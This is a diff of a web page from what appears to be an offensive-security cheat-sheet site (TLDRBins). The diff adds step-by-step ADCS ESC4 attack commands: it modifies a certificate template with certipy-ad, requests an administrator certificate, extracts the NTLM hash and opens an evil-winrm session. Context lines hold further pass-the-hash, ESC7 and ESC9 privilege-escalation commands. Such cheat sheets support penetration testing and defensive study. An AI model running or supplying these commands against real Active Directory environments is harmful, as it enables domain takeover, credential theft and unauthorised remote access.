@@ -481,6 +481,20 @@ body.dark-mode #dynamicFormContainer button:hover {
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-psexec -hashes :&lt;HASH&gt; administrator@&lt;DOMAIN&gt; cmd.exe
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p></div></p>
 <hr>
+<h3 id="esc4">ESC4</h3>
+<p>
+<button data-tabset="set7" data-tabcontent="tab1" >Linux</button>
+
+<div class="tabcontent" data-tabset="set7" data-tabcontent="tab1"><h4 id="1-update-template">1. Update Template</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad template -username &#39;&lt;USER&gt;&#39; -hashes &#39;&lt;HASH&gt;&#39; -template &#39;&lt;TEMPLATE&gt;&#39; -target &lt;TARGET&gt; -save-old
+</span></span></span></code></pre></div><h4 id="2-request-a-cert-based-on-the-esc4-template">2. Request a Cert Based on the ESC4 Template</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -username &#39;&lt;USER&gt;&#39; -hashes &#39;&lt;HASH&gt;&#39; -template &#39;&lt;TEMPLATE&gt;&#39; -target &lt;TARGET&gt; -ca &lt;CA&gt; -upn administrator@&lt;DOMAIN&gt;
+</span></span></span></code></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx administrator.pfx -dc-ip &lt;DC_IP&gt;
+</span></span></span></code></pre></div><h4 id="4-remote">4. Remote</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div></div></p>
+<hr>
 <h3 id="esc7">ESC7</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+---------------------+
 </span></span></span><span class="line"><span class="cl"><span class="go">| Access Right        |
@@ -490,9 +504,9 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">+---------------------+
 </span></span></span></code></pre></div><br>
 <p>
-<button data-tabset="set7" data-tabcontent="tab1" >Linux</button>
+<button data-tabset="set8" data-tabcontent="tab1" >Linux</button>
 
-<div class="tabcontent" data-tabset="set7" data-tabcontent="tab1"><h4 id="1-use-manageca-privilege-to-add-manage-certificates-permission">1. Use ManageCA Privilege to Add Manage Certificates Permission</h4>
+<div class="tabcontent" data-tabset="set8" data-tabcontent="tab1"><h4 id="1-use-manageca-privilege-to-add-manage-certificates-permission">1. Use ManageCA Privilege to Add Manage Certificates Permission</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad ca -ca &lt;CA&gt; -add-officer &#39;&lt;USER&gt;&#39; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
 </span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -dc-ip &lt;DC&gt; -ns &lt;DC_IP&gt; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -vulnerable -stdout
@@ -511,9 +525,9 @@ body.dark-mode #dynamicFormContainer button:hover {
 <hr>
 <h3 id="esc9">ESC9</h3>
 <p>
-<button data-tabset="set8" data-tabcontent="tab1" >Linux</button>
+<button data-tabset="set9" data-tabcontent="tab1" >Linux</button>
 
-<div class="tabcontent" data-tabset="set8" data-tabcontent="tab1"><h4 id="1-modify-target-users-userprincipalname-with-genericallgenericwrite">1. Modify Target User&rsquo;s userPrincipalName (With GenericAll/GenericWrite)</h4>
+<div class="tabcontent" data-tabset="set9" data-tabcontent="tab1"><h4 id="1-modify-target-users-userprincipalname-with-genericallgenericwrite">1. Modify Target User&rsquo;s userPrincipalName (With GenericAll/GenericWrite)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad account update -username &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -hashes &lt;HASH&gt; -user &lt;TARGET_USER&gt; -upn Administrator
 </span></span></span></code></pre></div><h4 id="2-request-a-cert-of-targer-user">2. Request a Cert of Targer User</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -username &#39;&lt;TARGET_USER&gt;@&lt;DOMAIN&gt;&#39; -password &#39;&lt;PASSWORD&gt;&#39; -ca &lt;CA&gt; -template &lt;VULN_TEMPLATE&gt;
@@ -559,7 +573,7 @@ body.dark-mode #dynamicFormContainer button:hover {
     <footer>
     <hr>
     <div class="footer-text">
-        <div>© 2024 TLDRBins</div>
+        <div>© 2025 TLDRBins</div>
     </div>
 </footer>
 </body>
